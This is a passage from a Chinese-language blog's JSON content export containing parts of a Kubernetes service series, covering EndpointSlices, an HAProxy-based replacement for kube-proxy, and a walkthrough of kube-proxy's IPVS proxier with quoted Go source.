nat] 10008 ipset.go:173] Successfully add entry: 192.168.1.241,tcp:80,192.168.1.241 to ip set: KUBE-LOOP-BACK 总结 Endpoints 与 EndpointSlices 均是为service提供端点的 Service规模越大，那么Endpoints中的 Pod 数量越大，传输的 EndPoints 对象就越大。集群中 Pod 更改的频率越高，也意味着传输在网络中发生的频率就越高 Endpoints 对象在大规模集群场景下存在下列问题： 增加网络流量 超大规模的 service 理论上会无法存储 该 Endpoints 处理Endpoints资源的 worker 会消耗更多的计算资源 隐性增加对控制平面的影响，service的可扩展性将降低 Endpointslices 解决了： 部分更新，更少的网络流量 Worker 处理 Endpoints 更新所需的资源更少 减少对控制平面的影响，提升的性能和 service 规模 Reference\n[1] EndpointSlices\n[2] EndpointSlice API\n[3] Scaling Kubernetes Networking With EndpointSlices\n[4] Scalability Limitations of the Endpoints API\n","permalink":"https://www.oomkill.com/2023/02/ch18-endpointslices/","summary":"","title":"深入理解Kubernetes service - EndpointSlices做了什么？"},{"content":" 本文是关于Kubernetes service解析的第四章\n深入理解Kubernetes service - 你真的理解service吗? 深入理解Kubernetes service - EndpointSlices做了什么？ 深入理解Kubernetes service - kube-proxy架构分析 深入理解Kubernetes service - 如何扩展现有的kube-proxy架构？ 所有关于Kubernetes service 部分代码上传至仓库 github.com/cylonchau/kube-haproxy\nOverview 在前两部分中，学习了一些 service,于kube-proxy在设计架构，但存在扩展问题将引入了一些问题：\n为什么需要了解这部分内容呢？ 与传统架构有什么区别呢？ 于eBPF 的 cilium又有什么区别呢？ 既然eBPF可以做到，那为什么要这部分内容呢？ 接下来的内容将围绕这四个问题展开来讲，而不是代码的讲解，代码可以看置顶\nIPVS与iptables在kubernetes中应用时的问题 对于在使用了kubernetes用户以及了解 kube-proxy 架构后，知道当集群规模过大时，service必将增多，而一个service未必是一条iptables/ipvs规则，对于kubernetes这种分布式架构来说，集群规模越大，集群状态就越不可控，尤其时kube-proxy。\n为什么单指kube-proxy呢？想想可以知道，pod的故障 或 node 的故障对于kubernetes集群来说却不是致命的，因为 这些资源集群中存在 避免方案，例如Pod的驱逐。而kube-proxy或iptables/IPVS问题将导致服务的不可控 『抖动』例如规则生成的快慢和Pod就绪的快慢不一致，部分节点不存在 service 此时服务必然抖动。\n再例如 iptables/IPVS 排查的难度对于普通运维工程师或开发工程师的技术水平有很高的要求，网上随处可见分析该类问题的帖子：\nkube-proxy源码分析与问题定位\n案例分析：怎么解决海量IPVS规则带来的网络延时抖动问题？\nipvs 连接复用引发的系列问题\nInvestigating Causes of Jitter in Container Networking\nContainerNative network LoadBalancer IPVS jitter\n对于上述问题，相信遇到了很难定位处理，虽然现在已fixed，并有eBPF技术的加入减少了此类问题的发生，但是eBPF实际同理于IPVS 都是需要对Linux内核有一定了解后才可以，这也就是为什么需要了解这部分\n如果需要自定义proxier为什么会解决这个问题 这里就是放大到kubernetes意外的传统架构中，当直接部署于Linux系统上使用nginx等传统LB时就很少有人提到这些问题了，而这些问题存在一个关键字「Container」；而引发这个问题的则是 service。去除 service 的功能，传统架构于Kubernetes架构部署的应用则是相同的，只是区分了名称空间。\n抓入关键的核心之后就做接下来的事情了，我称之为「shed kube-proxy, fetch service」；即把service提取到集群外部的LB之上，例如F5, nginx等。\n这里会存在一个疑问：「这个不是ingress吗？」，这个问题会在下一章讲到 proxier与ingress有什么区别?\n软件的设计 既然拿到了核心问题就该定义软件工作模式，这里将软件架构设计为三种：\nonly fetch：任然需要 kube-proxy 组件，通过定义 contoller 将流量引入，即不过service，这种场景不会破坏现有的集群架构，从而去除service的功能，如果需要service功能配置外部service即可 SK (similar kube-proxy)：通过效仿kube-proxy + ipvs架构，将LB于proxier部署在每个worker节点上，让浏览都走本地 replacement kube-proxy：完全取代kube-proxy 这于cilium类似了，但不同的是，proxier 可以于 kube-controller-manager；kube-scheduler 作为控制平面为集群提供 service 功能，而无需为所有worker节点都部署一个 kube-proxy 或 cilium 这种架构 最后一个问题 此时可以引入最后一个问题了：「既然eBPF可以做到，那为什么要这部分内容呢？」。\n答：其一简单，每个运维人员无需额外知识都可以对 service 问题进行排错，简便了运维复杂度。另外这一部分其实是对于完整企业生态来讲，统一的流量转发平台是所必须的，有了这个就不需要单独的 service 功能了\n实践：基于haproxy的proxier 在扩展proxier需要对 kube-proxy 有一定的了解，并且，kube-proxy 在可扩展性来说做的也是相当不错的，我们只需要实现一个 proxier.go 就可以基本上完成了对 kube-proxy ；而 proxier.go 的核心方法只需要三个函数即可（==这里是根据iptables/ipvs的设计进行的，也可以整合为一个方法==）\n除了这三个函数外，其他的函数全都是 kube-proxy 已经实现好的通用的，这里直接使用或者按照其他内置proxier的方法即可\n满足条件 haproxy工作与proxier相同的节点，可以是集群内也可以是集群外，整个集群只需要一个 实现方法：syncProxyRules(), syncService(), syncEndpoint() 查看当前的service\n$ kubectl get endpointslices NAME ADDRESSTYPE PORTS ENDPOINTS AGE kubernetes IPv4 6443 10.0.0.4 195d netbox-l489z IPv4 80 192.168.1.241,192.168.1.242 2d1h 查看service 配置\napiVersion: v1 kind: Service metadata: name: netbox spec: clusterIP: 192.168.129.5 ports: - port: 88 protocol: TCP targetPort: 80 selector: app: nginx sessionAffinity: None type: ClusterIP status: loadBalancer: {} 通过 proxier 生成了对应的 backend 与 frontend，这样就可以通过 haproxy 作为一个外部LB来跨过 service 与 IPVS/IPTables，通过这种情况下，我们可以将集群拉出一个平面至传统架构上，而又不影响集群的功能\n在这种场景下需要注意的是：\nOF模式下，我们需要 kube-proxy 组件，而使用 kube-proxy 组件 所有模式下，haproxy worker和kubernetes nodes需处于一个网络平面 非OF模式下需要自行修改 kube-apiserver 源代码（主要是使kubernetes service分配机制） Proxier与Ingress的区别 肯定有人会问，kubernetes提供了Ingress功能不是和这个一样吗？\n答：对比一个LB是Proxier还是Ingress最好的区别就是“舍去kube-proxy”可以工作正常吗？\n而kubernetes官方也提供说明，Ingress的后端是service，service的后端则是IPVS/IPTables，而IPVS的后端才是Pod；相对于Proxier LB，他的后端则直接是Pod，跨越了Service。\nKubernetes Ingress 架构说明 [1] Traefik Ingress 架构说明 [2] APISIX Ingress 架构说明 [3] 而相对的本文的学习思路，haproxy官方提供了对应的解决方案 [4] ；而由此，可以灵活的为Kubernetes提供更多的LB方案\nReference\n[1] Kubernetes Ingress 架构说明\n[2] Traefik Ingress 架构说明\n[3] APISIX Ingress 架构说明\n[4] External haproxy\n","permalink":"https://www.oomkill.com/2023/02/ch23-extend-kube-proxy/","summary":"","title":"深入理解Kubernetes service - 如何扩展现有的kube-proxy架构？"},{"content":"前提概述 kubernetes集群中运行在每个Worker节点上的组件 kube-proxy，本文讲解的是如何快速的了解 kube-proxy 的软件架构，而不是流程的分析，专注于 proxy 层面的设计讲解，而不会贴大量的代码\nkube-proxy软件设计 kube-proxy 在设计上分为三个模块 server 于 proxy：\nserver: 是一个常驻进程用于处理service的事件 proxy: 是 kube-proxy 的工作核心，实际上的角色是一个 service controller，通过监听 node, service, endpoint 而生成规则 proxier: 是实现service的组件，例如iptables, ipvs\u0026hellip;. 如何快速读懂kube-proxy源码 要想快速读懂 kube-proxy 源码就需要对 kube-proxy 设计有深刻的了解，例如需要看 kube-proxy 的实现，我们就可以看 proxy的部分，下列是 proxy 部分的目录结构\n$ tree -L 1 . ├── BUILD ├── OWNERS ├── apis ├── config ├── healthcheck ├── iptables ├── ipvs ├── metaproxier ├── metrics ├── userspace ├── util ├── winuserspace ├── winkernel ├── doc.go ├── endpoints.go ├── endpoints_test.go ├── endpointslicecache.go ├── endpointslicecache_test.go ├── service.go ├── service_test.go ├── topology.go ├── topology_test.go └── types.go 目录 ipvs, iptables, 就是所知的 kube-proxy 提供的两种 load balancer 目录 apis, 则是kube-proxy 配置文件资源类型的定义，--config=/etc/kubernetes/kube-proxy-config.yaml 所指定问题的shema 目录config: 定义了每种资源的handler需要实现什么 service.go, endpoints.go：是controller的实现 type.go: 是每个资源的interface定义，例如： Provider: 规定了每个proxier需要实现什么 ServicePort: service 控制器需要实现什么 Endpoint: service 控制器需要实现什么 上述是整个 proxy 的一级结构\nservice controller service控制器换句话说，就是工作内容类似于kubernetes集群中的pod控制器那些，所作的工作就是监听对应资源做出相应事件处理，而这个处理被定义为 handler\ntype Provider interface { config.EndpointsHandler config.EndpointSliceHandler config.ServiceHandler config.NodeHandler // Sync immediately synchronizes the Provider's current state to proxy rules. Sync() // SyncLoop runs periodic work. // This is expected to run as a goroutine or as the main loop of the app. // It does not return. SyncLoop() } 由上面代码可以看到，每一个Provider 即 proxier （用于实现的LB的控制器）都需要包含对应资源的事件处理函数于 一个 Sync() 和 SyncLoop()，所以这里将总结为 controller 而不是用于这里给到的术语\n同理，其他类型的 controller 则是相同与 service controller\n深入理解proxier 这里将以 ipvs 为例，如图所示，这将是一个 proxier 的实现，而 proxier.go 则是真实的 proxier 实现\n图：Kubernetes API 请求的请求处理步骤图（详细） 而 ipvs 的 proxier 则是如下定义的\ntype Proxier struct { // endpointsChanges and serviceChanges contains all changes to endpoints and // services that happened since last syncProxyRules call. For a single object, // changes are accumulated, i.e. previous is state from before all of them, // current is state after applying all of those. endpointsChanges *proxy.EndpointChangeTracker serviceChanges *proxy.ServiceChangeTracker mu sync.Mutex // protects the following fields serviceMap proxy.ServiceMap endpointsMap proxy.EndpointsMap portsMap map[utilproxy.LocalPort]utilproxy.Closeable nodeLabels map[string]string // endpointsSynced, endpointSlicesSynced, and servicesSynced are set to true when // corresponding objects are synced after startup. This is used to avoid updating // ipvs rules with some partial data after kube-proxy restart. endpointsSynced bool endpointSlicesSynced bool servicesSynced bool initialized int32 syncRunner *async.BoundedFrequencyRunner // governs calls to syncProxyRules // These are effectively const and do not need the mutex to be held. syncPeriod time.Duration minSyncPeriod time.Duration // Values are CIDR's to exclude when cleaning up IPVS rules. excludeCIDRs []*net.IPNet // Set to true to set sysctls arp_ignore and arp_announce strictARP bool iptables utiliptables.Interface ipvs utilipvs.Interface ipset utilipset.Interface exec utilexec.Interface masqueradeAll bool masqueradeMark string localDetector proxyutiliptables.LocalTrafficDetector hostname string nodeIP net.IP portMapper utilproxy.PortOpener recorder record.EventRecorder serviceHealthServer healthcheck.ServiceHealthServer healthzServer healthcheck.ProxierHealthUpdater ipvsScheduler string // Added as a member to the struct to allow injection for testing. ipGetter IPGetter // The following buffers are used to reuse memory and avoid allocations // that are significantly impacting performance. iptablesData *bytes.Buffer filterChainsData *bytes.Buffer natChains *bytes.Buffer filterChains *bytes.Buffer natRules *bytes.Buffer filterRules *bytes.Buffer // Added as a member to the struct to allow injection for testing. netlinkHandle NetLinkHandle // ipsetList is the list of ipsets that ipvs proxier used. ipsetList map[string]*IPSet // Values are as a parameter to select the interfaces which nodeport works. nodePortAddresses []string // networkInterfacer defines an interface for several net library functions. // Inject for test purpose. networkInterfacer utilproxy.NetworkInterfacer gracefuldeleteManager *GracefulTerminationManager } 再看这个结构体的 structure，发现他实现了上述提到的 Handler 和 Sync()\n可以看到 Sync() 的实现是调用 runner.Run()\nfunc (proxier *Proxier) Sync() { if proxier.healthzServer != nil { proxier.healthzServer.QueuedUpdate() } metrics.SyncProxyRulesLastQueuedTimestamp.SetToCurrentTime() proxier.syncRunner.Run() } 而 handler 中的任意事件的触发则是调用 Sync()\n// handler 不同的事件均指向 On{rs}Update() 函数 func (proxier *Proxier) OnEndpointsAdd(endpoints *v1.Endpoints) { proxier.OnEndpointsUpdate(nil, endpoints) } // OnEndpointsDelete is called whenever deletion of an existing endpoints object is observed. func (proxier *Proxier) OnEndpointsDelete(endpoints *v1.Endpoints) { proxier.OnEndpointsUpdate(endpoints, nil) } ... // 而 update 调用的则是 Sync() func (proxier *Proxier) OnEndpointsUpdate(oldEndpoints, endpoints *v1.Endpoints) { if proxier.endpointsChanges.Update(oldEndpoints, endpoints) \u0026amp;\u0026amp; proxier.isInitialized() { proxier.Sync() } } 到了这里，明了了 runner 才是这个 proxier 的核心，被定义于 proxier 结构图的 syncRunner 在初始化时被注入了函数 syncProxyRules()\nfunc NewProxier(ipt utiliptables.Interface, ... proxier.syncRunner = async.NewBoundedFrequencyRunner(\u0026quot;sync-runner\u0026quot;, proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs) proxier.gracefuldeleteManager.Run() return proxier, nil } syncProxyRules() 而这个 syncProxyRules() 则是完成了整个 ipvs 以及 service 的生命周期\n对于了解kubernetes架构的同学来说，kube-proxy 完成的功能就是 ipvs 的规则管理，那么换句话说就是干预 ipvs 规则的生命周期，也就是分析函数 syncProxyRules() 是如何干预这些规则的。\nsyncProxyRules() 将动作分为两部分，一是对 ipvs 资源的增改，二是对资源的销毁；引入完概念后，就开始进行分析吧。\n600多行的代码看起来很困难，那就拆分成步骤进行分析\nstep1 前期准备工作 为什么这么叫第一部分呢？看下列代码就知道，做的工作和 ipvs rules 没多大关系\nfunc (proxier *Proxier) syncProxyRules() { // 互斥锁 proxier.mu.Lock() defer proxier.mu.Unlock() // don't sync rules till we've received services and endpoints // 在等待接收完信息前，不同步收到的 services和endpoints资源 if !proxier.isInitialized() { klog.V(2).Info(\u0026quot;Not syncing ipvs rules until Services and Endpoints have been received from master\u0026quot;) return } // Keep track of how long syncs take. // 记录同步耗时 start := time.Now() defer func() { metrics.SyncProxyRulesLatency.Observe(metrics.SinceInSeconds(start)) klog.V(4).Infof(\u0026quot;syncProxyRules took %v\u0026quot;, time.Since(start)) }() // 获取本地多个IP地址 localAddrs, err := utilproxy.GetLocalAddrs() if err != nil { klog.Errorf(\u0026quot;Failed to get local addresses during proxy sync: %v, assuming external IPs are not local\u0026quot;, err) } else if len(localAddrs) == 0 { klog.Warning(\u0026quot;No local addresses found, assuming all external IPs are not local\u0026quot;) } localAddrSet := utilnet.IPSet{} localAddrSet.Insert(localAddrs...) // We assume that if this was called, we really want to sync them, // even if nothing changed in the meantime. In other words, callers are // responsible for detecting no-op changes and not calling this function. // 这两步骤正如注释所讲，如果在资源修改的前提下需要同步，也就是update操作包含了增改 serviceUpdateResult := proxy.UpdateServiceMap(proxier.serviceMap, proxier.serviceChanges) endpointUpdateResult := proxier.endpointsMap.Update(proxier.endpointsChanges) // 陈腐的UDP信息处理 staleServices := serviceUpdateResult.UDPStaleClusterIP // merge stale services gathered from updateEndpointsMap for _, svcPortName := range endpointUpdateResult.StaleServiceNames { if svcInfo, ok := proxier.serviceMap[svcPortName]; ok \u0026amp;\u0026amp; svcInfo != nil \u0026amp;\u0026amp; conntrack.IsClearConntrackNeeded(svcInfo.Protocol()) { klog.V(2).Infof(\u0026quot;Stale %s service %v -\u0026gt; %s\u0026quot;, strings.ToLower(string(svcInfo.Protocol())), svcPortName, svcInfo.ClusterIP().String()) staleServices.Insert(svcInfo.ClusterIP().String()) for _, extIP := range svcInfo.ExternalIPStrings() { staleServices.Insert(extIP) } } } step2：构建IPVS规则 首先会经历一些预处理的操作 这部分掠过了 L1042-L1140\nklog.V(3).Infof(\u0026quot;Syncing ipvs Proxier rules\u0026quot;) // Begin install iptables // Reset all buffers used later. // This is to avoid memory reallocations and thus improve performance. proxier.natChains.Reset() proxier.natRules.Reset() proxier.filterChains.Reset() proxier.filterRules.Reset() // Write table headers. writeLine(proxier.filterChains, \u0026quot;*filter\u0026quot;) writeLine(proxier.natChains, \u0026quot;*nat\u0026quot;) proxier.createAndLinkeKubeChain() // make sure dummy interface exists in the system where ipvs Proxier will bind service address on it _, err = proxier.netlinkHandle.EnsureDummyDevice(DefaultDummyDevice) if err != nil { klog.Errorf(\u0026quot;Failed to create dummy interface: %s, error: %v\u0026quot;, DefaultDummyDevice, err) return } // make sure ip sets exists in the system. for _, set := range proxier.ipsetList { if err := ensureIPSet(set); err != nil { return } set.resetEntries() } // Accumulate the set of local ports that we will be holding open once this update is complete replacementPortsMap := map[utilproxy.LocalPort]utilproxy.Closeable{} // activeIPVSServices represents IPVS service successfully created in this round of sync activeIPVSServices := map[string]bool{} // currentIPVSServices represent IPVS services listed from the system currentIPVSServices := make(map[string]*utilipvs.VirtualServer) // activeBindAddrs represents ip address successfully bind to DefaultDummyDevice in this round of sync activeBindAddrs := map[string]bool{} bindedAddresses, err := proxier.ipGetter.BindedIPs() if err != nil { klog.Errorf(\u0026quot;error listing addresses binded to dummy interface, error: %v\u0026quot;, err) } // 检查是否是nodeport类型 hasNodePort := false for _, svc := range proxier.serviceMap { svcInfo, ok := svc.(*serviceInfo) if ok \u0026amp;\u0026amp; svcInfo.NodePort() != 0 { hasNodePort = true break } } // Both nodeAddresses and nodeIPs can be reused for all nodePort services // and only need to be computed if we have at least one nodePort service. var ( // List of node addresses to listen on if a nodePort is set. nodeAddresses []string // List of node IP addresses to be used as IPVS services if nodePort is set. nodeIPs []net.IP ) if hasNodePort { nodeAddrSet, err := utilproxy.GetNodeAddresses(proxier.nodePortAddresses, proxier.networkInterfacer) if err != nil { klog.Errorf(\u0026quot;Failed to get node ip address matching nodeport cidr: %v\u0026quot;, err) } else { nodeAddresses = nodeAddrSet.List() for _, address := range nodeAddresses { if utilproxy.IsZeroCIDR(address) { nodeIPs, err = proxier.ipGetter.NodeIPs() if err != nil { klog.Errorf(\u0026quot;Failed to list all node IPs from host, err: %v\u0026quot;, err) } break } nodeIPs = append(nodeIPs, net.ParseIP(address)) } } } 接下来是整个构建ipvs规则的关键部分，大概200-300行代码，通过循环 serviceMap 拿到每一个 service 的信息，然后在通过 循环 endpointsMap[svcName] 得到每个 service下所属的 endpoint ，然后构建 ipvs 的规则\nL1141-L1542 这里也包含了 nodeport, clusterIP, ingress等不同的service类型\n// Build IPVS rules for each service. for svcName, svc := range proxier.serviceMap { svcInfo, ok := svc.(*serviceInfo) if !ok { klog.Errorf(\u0026quot;Failed to cast serviceInfo %q\u0026quot;, svcName.String()) continue } isIPv6 := utilnet.IsIPv6(svcInfo.ClusterIP()) protocol := strings.ToLower(string(svcInfo.Protocol())) // Precompute svcNameString; with many services the many calls // to ServicePortName.String() show up in CPU profiles. svcNameString := svcName.String() // 循环endpoint // Handle traffic that loops back to the originator with SNAT. for _, e := range proxier.endpointsMap[svcName] { ep, ok := e.(*proxy.BaseEndpointInfo) if !ok { klog.Errorf(\u0026quot;Failed to cast BaseEndpointInfo %q\u0026quot;, e.String()) continue } if !ep.IsLocal { continue } epIP := ep.IP() epPort, err := ep.Port() // Error parsing this endpoint has been logged. Skip to next endpoint. if epIP == \u0026quot;\u0026quot; || err != nil { continue } entry := \u0026amp;utilipset.Entry{ IP: epIP, Port: epPort, Protocol: protocol, IP2: epIP, SetType: utilipset.HashIPPortIP, } if valid := proxier.ipsetList[kubeLoopBackIPSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoopBackIPSet].Name)) continue } proxier.ipsetList[kubeLoopBackIPSet].activeEntries.Insert(entry.String()) } // Capture the clusterIP. // ipset call entry := \u0026amp;utilipset.Entry{ IP: svcInfo.ClusterIP().String(), Port: svcInfo.Port(), Protocol: protocol, SetType: utilipset.HashIPPort, } // add service Cluster IP:Port to kubeServiceAccess ip set for the purpose of solving hairpin. // proxier.kubeServiceAccessSet.activeEntries.Insert(entry.String()) if valid := proxier.ipsetList[kubeClusterIPSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeClusterIPSet].Name)) continue } proxier.ipsetList[kubeClusterIPSet].activeEntries.Insert(entry.String()) // ipvs call serv := \u0026amp;utilipvs.VirtualServer{ Address: svcInfo.ClusterIP(), Port: uint16(svcInfo.Port()), Protocol: string(svcInfo.Protocol()), Scheduler: proxier.ipvsScheduler, } // Set session affinity flag and timeout for IPVS service if svcInfo.SessionAffinityType() == v1.ServiceAffinityClientIP { serv.Flags |= utilipvs.FlagPersistent serv.Timeout = uint32(svcInfo.StickyMaxAgeSeconds()) } // We need to bind ClusterIP to dummy interface, so set `bindAddr` parameter to `true` in syncService() if err := proxier.syncService(svcNameString, serv, true, bindedAddresses); err == nil { activeIPVSServices[serv.String()] = true activeBindAddrs[serv.Address.String()] = true // ExternalTrafficPolicy only works for NodePort and external LB traffic, does not affect ClusterIP // So we still need clusterIP rules in onlyNodeLocalEndpoints mode. if err := proxier.syncEndpoint(svcName, false, serv); err != nil { klog.Errorf(\u0026quot;Failed to sync endpoint for service: %v, err: %v\u0026quot;, serv, err) } } else { klog.Errorf(\u0026quot;Failed to sync service: %v, err: %v\u0026quot;, serv, err) } // Capture externalIPs. for _, externalIP := range svcInfo.ExternalIPStrings() { // If the \u0026quot;external\u0026quot; IP happens to be an IP that is local to this // machine, hold the local port open so no other process can open it // (because the socket might open but it would never work). if (svcInfo.Protocol() != v1.ProtocolSCTP) \u0026amp;\u0026amp; localAddrSet.Has(net.ParseIP(externalIP)) { // We do not start listening on SCTP ports, according to our agreement in the SCTP support KEP lp := utilproxy.LocalPort{ Description: \u0026quot;externalIP for \u0026quot; + svcNameString, IP: externalIP, Port: svcInfo.Port(), Protocol: protocol, } if proxier.portsMap[lp] != nil { klog.V(4).Infof(\u0026quot;Port %s was open before and is still needed\u0026quot;, lp.String()) replacementPortsMap[lp] = proxier.portsMap[lp] } else { socket, err := proxier.portMapper.OpenLocalPort(\u0026amp;lp, isIPv6) if err != nil { msg := fmt.Sprintf(\u0026quot;can't open %s, skipping this externalIP: %v\u0026quot;, lp.String(), err) proxier.recorder.Eventf( \u0026amp;v1.ObjectReference{ Kind: \u0026quot;Node\u0026quot;, Name: proxier.hostname, UID: types.UID(proxier.hostname), Namespace: \u0026quot;\u0026quot;, }, v1.EventTypeWarning, err.Error(), msg) klog.Error(msg) continue } replacementPortsMap[lp] = socket } } // We're holding the port, so it's OK to install IPVS rules. // ipset call entry := \u0026amp;utilipset.Entry{ IP: externalIP, Port: svcInfo.Port(), Protocol: protocol, SetType: utilipset.HashIPPort, } if utilfeature.DefaultFeatureGate.Enabled(features.ExternalPolicyForExternalIP) \u0026amp;\u0026amp; svcInfo.OnlyNodeLocalEndpoints() { if valid := proxier.ipsetList[kubeExternalIPLocalSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeExternalIPLocalSet].Name)) continue } proxier.ipsetList[kubeExternalIPLocalSet].activeEntries.Insert(entry.String()) } else { // We have to SNAT packets to external IPs. if valid := proxier.ipsetList[kubeExternalIPSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeExternalIPSet].Name)) continue } proxier.ipsetList[kubeExternalIPSet].activeEntries.Insert(entry.String()) } // ipvs call serv := \u0026amp;utilipvs.VirtualServer{ Address: net.ParseIP(externalIP), Port: uint16(svcInfo.Port()), Protocol: string(svcInfo.Protocol()), Scheduler: proxier.ipvsScheduler, } if svcInfo.SessionAffinityType() == v1.ServiceAffinityClientIP { serv.Flags |= utilipvs.FlagPersistent serv.Timeout = uint32(svcInfo.StickyMaxAgeSeconds()) } if err := proxier.syncService(svcNameString, serv, true, bindedAddresses); err == nil { activeIPVSServices[serv.String()] = true activeBindAddrs[serv.Address.String()] = true onlyNodeLocalEndpoints := false if utilfeature.DefaultFeatureGate.Enabled(features.ExternalPolicyForExternalIP) { onlyNodeLocalEndpoints = svcInfo.OnlyNodeLocalEndpoints() } if err := proxier.syncEndpoint(svcName, onlyNodeLocalEndpoints, serv); err != nil { klog.Errorf(\u0026quot;Failed to sync endpoint for service: %v, err: %v\u0026quot;, serv, err) } } else { klog.Errorf(\u0026quot;Failed to sync service: %v, err: %v\u0026quot;, serv, err) } } // Capture load-balancer ingress. for _, ingress := range svcInfo.LoadBalancerIPStrings() { if ingress != \u0026quot;\u0026quot; { // ipset call entry = \u0026amp;utilipset.Entry{ IP: ingress, Port: svcInfo.Port(), Protocol: protocol, SetType: utilipset.HashIPPort, } // add service load balancer ingressIP:Port to kubeServiceAccess ip set for the purpose of solving hairpin. // proxier.kubeServiceAccessSet.activeEntries.Insert(entry.String()) // If we are proxying globally, we need to masquerade in case we cross nodes. // If we are proxying only locally, we can retain the source IP. if valid := proxier.ipsetList[kubeLoadBalancerSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoadBalancerSet].Name)) continue } proxier.ipsetList[kubeLoadBalancerSet].activeEntries.Insert(entry.String()) // insert loadbalancer entry to lbIngressLocalSet if service externaltrafficpolicy=local if svcInfo.OnlyNodeLocalEndpoints() { if valid := proxier.ipsetList[kubeLoadBalancerLocalSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoadBalancerLocalSet].Name)) continue } proxier.ipsetList[kubeLoadBalancerLocalSet].activeEntries.Insert(entry.String()) } if len(svcInfo.LoadBalancerSourceRanges()) != 0 { // The service firewall rules are created based on ServiceSpec.loadBalancerSourceRanges field. // This currently works for loadbalancers that preserves source ips. // For loadbalancers which direct traffic to service NodePort, the firewall rules will not apply. if valid := proxier.ipsetList[kubeLoadbalancerFWSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoadbalancerFWSet].Name)) continue } proxier.ipsetList[kubeLoadbalancerFWSet].activeEntries.Insert(entry.String()) allowFromNode := false for _, src := range svcInfo.LoadBalancerSourceRanges() { // ipset call entry = \u0026amp;utilipset.Entry{ IP: ingress, Port: svcInfo.Port(), Protocol: protocol, Net: src, SetType: utilipset.HashIPPortNet, } // enumerate all white list source cidr if valid := proxier.ipsetList[kubeLoadBalancerSourceCIDRSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoadBalancerSourceCIDRSet].Name)) continue } proxier.ipsetList[kubeLoadBalancerSourceCIDRSet].activeEntries.Insert(entry.String()) // ignore error because it has been validated _, cidr, _ := net.ParseCIDR(src) if cidr.Contains(proxier.nodeIP) { allowFromNode = true } } // generally, ip route rule was added to intercept request to loadbalancer vip from the // loadbalancer's backend hosts. In this case, request will not hit the loadbalancer but loop back directly. // Need to add the following rule to allow request on host. if allowFromNode { entry = \u0026amp;utilipset.Entry{ IP: ingress, Port: svcInfo.Port(), Protocol: protocol, IP2: ingress, SetType: utilipset.HashIPPortIP, } // enumerate all white list source ip if valid := proxier.ipsetList[kubeLoadBalancerSourceIPSet].validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, proxier.ipsetList[kubeLoadBalancerSourceIPSet].Name)) continue } proxier.ipsetList[kubeLoadBalancerSourceIPSet].activeEntries.Insert(entry.String()) } } // ipvs call serv := \u0026amp;utilipvs.VirtualServer{ Address: net.ParseIP(ingress), Port: uint16(svcInfo.Port()), Protocol: string(svcInfo.Protocol()), Scheduler: proxier.ipvsScheduler, } if svcInfo.SessionAffinityType() == v1.ServiceAffinityClientIP { serv.Flags |= utilipvs.FlagPersistent serv.Timeout = uint32(svcInfo.StickyMaxAgeSeconds()) } if err := proxier.syncService(svcNameString, serv, true, bindedAddresses); err == nil { activeIPVSServices[serv.String()] = true activeBindAddrs[serv.Address.String()] = true if err := proxier.syncEndpoint(svcName, svcInfo.OnlyNodeLocalEndpoints(), serv); err != nil { klog.Errorf(\u0026quot;Failed to sync endpoint for service: %v, err: %v\u0026quot;, serv, err) } } else { klog.Errorf(\u0026quot;Failed to sync service: %v, err: %v\u0026quot;, serv, err) } } } if svcInfo.NodePort() != 0 { if len(nodeAddresses) == 0 || len(nodeIPs) == 0 { // Skip nodePort configuration since an error occurred when // computing nodeAddresses or nodeIPs. continue } var lps []utilproxy.LocalPort for _, address := range nodeAddresses { lp := utilproxy.LocalPort{ Description: \u0026quot;nodePort for \u0026quot; + svcNameString, IP: address, Port: svcInfo.NodePort(), Protocol: protocol, } if utilproxy.IsZeroCIDR(address) { // Empty IP address means all lp.IP = \u0026quot;\u0026quot; lps = append(lps, lp) // If we encounter a zero CIDR, then there is no point in processing the rest of the addresses. break } lps = append(lps, lp) } // For ports on node IPs, open the actual port and hold it. for _, lp := range lps { if proxier.portsMap[lp] != nil { klog.V(4).Infof(\u0026quot;Port %s was open before and is still needed\u0026quot;, lp.String()) replacementPortsMap[lp] = proxier.portsMap[lp] // We do not start listening on SCTP ports, according to our agreement in the // SCTP support KEP } else if svcInfo.Protocol() != v1.ProtocolSCTP { socket, err := proxier.portMapper.OpenLocalPort(\u0026amp;lp, isIPv6) if err != nil { klog.Errorf(\u0026quot;can't open %s, skipping this nodePort: %v\u0026quot;, lp.String(), err) continue } if lp.Protocol == \u0026quot;udp\u0026quot; { conntrack.ClearEntriesForPort(proxier.exec, lp.Port, isIPv6, v1.ProtocolUDP) } replacementPortsMap[lp] = socket } // We're holding the port, so it's OK to install ipvs rules. } // Nodeports need SNAT, unless they're local. // ipset call var ( nodePortSet *IPSet entries []*utilipset.Entry ) switch protocol { case \u0026quot;tcp\u0026quot;: nodePortSet = proxier.ipsetList[kubeNodePortSetTCP] entries = []*utilipset.Entry{{ // No need to provide ip info Port: svcInfo.NodePort(), Protocol: protocol, SetType: utilipset.BitmapPort, }} case \u0026quot;udp\u0026quot;: nodePortSet = proxier.ipsetList[kubeNodePortSetUDP] entries = []*utilipset.Entry{{ // No need to provide ip info Port: svcInfo.NodePort(), Protocol: protocol, SetType: utilipset.BitmapPort, }} case \u0026quot;sctp\u0026quot;: nodePortSet = 